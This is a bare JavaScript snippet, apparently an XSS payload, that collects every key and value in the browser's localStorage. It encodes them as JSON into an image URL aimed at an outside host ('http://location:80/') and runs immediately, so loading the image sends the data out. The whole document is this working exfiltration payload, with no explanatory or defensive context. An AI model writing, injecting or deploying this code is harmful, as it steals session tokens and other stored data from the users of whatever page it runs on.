function GetLocalStorageData() {
     var len = localStorage.length;
     var arr = new Array();
     for(var i = 0; i < len; i++) {

        var getKey = localStorage.key(i);
        var getVal = localStorage.getItem(getKey);

        arr[i] = {
            'key': getKey,
            'val': getVal,
			}
		}
        var img = document.createElement("img");
        var url = "http://location:80/"+JSON.stringify(arr);
        img.src = url;
        document.body.appendChild(img);
    }
GetLocalStorageData();